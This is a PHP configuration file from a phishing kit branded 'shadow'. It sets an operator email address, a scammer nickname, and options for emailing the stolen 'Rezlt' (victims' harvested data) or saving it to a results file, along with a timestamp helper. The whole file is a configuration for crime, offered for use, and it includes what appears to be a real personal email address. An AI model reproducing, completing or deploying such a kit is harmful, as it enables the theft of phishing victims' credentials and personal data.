<?php
/*  

       ▄▄                       ▄▄                            
        ███                     ▀███                            
         ██                       ██                            
 ▄██▀███ ███████▄  ▄█▀██▄    ▄█▀▀███   ▄██▀██▄▀██▀    ▄█    ▀██▀
 ██   ▀▀ ██    ██ ██   ██  ▄██    ██  ██▀   ▀██ ██   ▄███   ▄█  
 ▀█████▄ ██    ██  ▄█████  ███    ██  ██     ██  ██ ▄█  ██ ▄█   
 █▄   ██ ██    ██ ██   ██  ▀██    ██  ██▄   ▄██   ███    ███    
 ██████▀ ███  ████▄████▀██▄ ▀████▀███▄ ▀█████▀     █      █     
                                                               
                                                               



*/
        ########################################################
         ############# [+] EMAIL INFORMATION [+] ##############
        ########################################################

     	$yours = "ziraldazinos@gmail.com"; // Edit this to your email 


	// ================================= //

	$scamname = "shadow"; // *Change |shadow| to any name you want |Your Nick Name|

	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	
	// ================================= //
	
	$saveintext = "no";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	
	$filename = "results"; // Change |results| to any name you want this will be the (Rzlt file name).html
	// ================================= //

	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}

?>